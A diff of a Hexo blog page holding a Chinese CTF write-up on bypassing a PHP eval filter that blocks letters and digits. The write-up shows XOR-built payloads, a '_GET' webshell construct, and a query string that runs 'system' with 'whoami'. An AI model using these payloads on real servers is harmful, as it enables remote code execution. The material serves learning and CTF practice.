@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&amp;lt;?phpinclude &amp;apos;flag.php&amp;apos;;if(isset($_GET[&amp;apos;code&amp;apos;]))&amp;#123;    $code = $_GET[&amp;apos;code&amp;apos;];    if(strlen($code)&amp;gt;40)&amp;#123">
+<meta name="description" content="最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(strlen($code)&amp;gt;40)&amp;#123;        die(&quot;Long.&quot;);    &amp;#12">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="无字母数字shell">
 <meta property="og:url" content="http://yoursite.com/2018/08/08/无字母数字shell/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blogs">
-<meta property="og:description" content="最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&amp;lt;?phpinclude &amp;apos;flag.php&amp;apos;;if(isset($_GET[&amp;apos;code&amp;apos;]))&amp;#123;    $code = $_GET[&amp;apos;code&amp;apos;];    if(strlen($code)&amp;gt;40)&amp;#123">
+<meta property="og:description" content="最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(strlen($code)&amp;gt;40)&amp;#123;        die(&quot;Long.&quot;);    &amp;#12">
 <meta property="og:locale" content="default">
 <meta property="og:updated_time" content="2019-02-21T07:33:02.891Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="无字母数字shell">
-<meta name="twitter:description" content="最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&amp;lt;?phpinclude &amp;apos;flag.php&amp;apos;;if(isset($_GET[&amp;apos;code&amp;apos;]))&amp;#123;    $code = $_GET[&amp;apos;code&amp;apos;];    if(strlen($code)&amp;gt;40)&amp;#123">
+<meta name="twitter:description" content="最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(strlen($code)&amp;gt;40)&amp;#123;        die(&quot;Long.&quot;);    &amp;#12">
 
 
 
@@ -187,6 +187,26 @@
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
           </a>
         </li>
       
@@ -322,12 +342,12 @@
       
 
       
-        <p>最近看到一个ctf题目，关于无字母数字获取shell的，记录一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>代码进行了字母数字过滤，并且限制了输入长度。<br>那么按照我们利用异或和php弱类型的一些特性，将符号转换为字母，再拼接函数，或者我们想要利用的webshell;<br>下面进行简单的演示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;g&apos;^&apos;&lt;&apos;;                   //  输出结果为 [ </span><br><span class="line">echo &apos;[&apos;^&apos;&lt;&apos;;                   //  这样便可以得到 g</span><br><span class="line">echo (&apos;[&apos;^&apos;&lt;&apos;).(&apos;:&apos;^&apos;_&apos;);       //  拼接之后得到  ge</span><br><span class="line">echo &apos;[:&apos;^&apos;&lt;_&apos;;                 //  为了减少长度，这样同样可以输出与上面相同的效果 ge</span><br><span class="line"></span><br><span class="line">echo &apos;[:[:,_]&apos;^&apos;&lt;_/|@&gt;:&apos;;//  构造出getFlag,而此时仅用了19个字符的长度</span><br></pre></td></tr></table></figure></p>
-<p>那么重点来了，既然我们已经构造出了getFlag，再加个()，拼接进去()不是就能直接读取题目的flag了,确实是这样，但如果直接拼进字符串是没有效果的，其只能作为字符串而不能被当作函数，我们还要进行适当的拼接。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_ = &apos;[:[:,_]&apos;^&apos;&lt;_/|@&gt;:&apos;;       //  getFlag</span><br><span class="line">$_();                           //  getFlag()  这样就会变成函数了</span><br></pre></td></tr></table></figure></p>
+        <p>最近看到一个ctf题目，关于无字母数字获取shell的，记录一下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $code = $_GET[<span class="string">'code'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    @<span class="keyword">eval</span>($code);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>代码进行了字母数字过滤，并且限制了输入长度。<br>那么按照我们利用异或和php弱类型的一些特性，将符号转换为字母，再拼接函数，或者我们想要利用的webshell;<br>下面进行简单的演示：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'g'</span>^<span class="string">'&lt;'</span>;                   <span class="comment">//  输出结果为 [ </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'['</span>^<span class="string">'&lt;'</span>;                   <span class="comment">//  这样便可以得到 g</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">'['</span>^<span class="string">'&lt;'</span>).(<span class="string">':'</span>^<span class="string">'_'</span>);       <span class="comment">//  拼接之后得到  ge</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'[:'</span>^<span class="string">'&lt;_'</span>;                 <span class="comment">//  为了减少长度，这样同样可以输出与上面相同的效果 ge</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'[:[:,_]'</span>^<span class="string">'&lt;_/|@&gt;:'</span>;<span class="comment">//  构造出getFlag,而此时仅用了19个字符的长度</span></span><br></pre></td></tr></table></figure></p>
+<p>那么重点来了，既然我们已经构造出了getFlag，再加个()，拼接进去()不是就能直接读取题目的flag了,确实是这样，但如果直接拼进字符串是没有效果的，其只能作为字符串而不能被当作函数，我们还要进行适当的拼接。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">'[:[:,_]'</span>^<span class="string">'&lt;_/|@&gt;:'</span>;       <span class="regexp">//</span>  getFlag</span><br><span class="line"><span class="variable">$_</span>();                           <span class="regexp">//</span>  getFlag()  这样就会变成函数了</span><br></pre></td></tr></table></figure></p>
 <p>那么我们最终的payload即为：<strong>?code=$<em>=’[:[:,</em>]’^’&lt;<em>/|@&gt;:’;$</em>();</strong></p>
-<p>这样仅仅是调用了一个输出flag的函数，那么我们要是在实际环境中想继续利用的话，我们需要构造出一个webshell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;               // _GET</span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);            // $_GET[_]($GET_[__])</span><br></pre></td></tr></table></figure></p>
-<p>这样就突破了code的长度限制，利用get传入两个变量，一个作为函数名，一个作为函数参数。就可以实现一个任意代码执行了。<br>例如利用system执行系统命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=system&amp;__=whoami</span><br></pre></td></tr></table></figure></p>
+<p>这样仅仅是调用了一个输出flag的函数，那么我们要是在实际环境中想继续利用的话，我们需要构造出一个webshell。<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$<span class="emphasis">_="`&#123;&#123;&#123;"^"?&lt;&gt;/";               // _</span>GET</span><br><span class="line">$&#123;$<span class="emphasis">_&#125;[_</span>]($&#123;$<span class="emphasis">_&#125;[_</span><span class="emphasis">_]);            // $_</span>GET[<span class="string">_</span>](<span class="link">$GET_[__]</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这样就突破了code的长度限制，利用get传入两个变量，一个作为函数名，一个作为函数参数。就可以实现一个任意代码执行了。<br>例如利用system执行系统命令<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$<span class="emphasis">_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_</span>&#125;[<span class="string">_</span>](<span class="link">$&#123;$_&#125;[__]</span>);&amp;<span class="emphasis">_=system&amp;_</span>_=whoami</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -345,7 +365,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
           
         </div>
       
@@ -438,7 +458,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -448,10 +468,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
-                
+                </a>
               </div>
             
 
@@ -459,10 +479,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">13</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -497,7 +517,8 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -507,6 +528,11 @@
 </div>
 
 
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
   <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
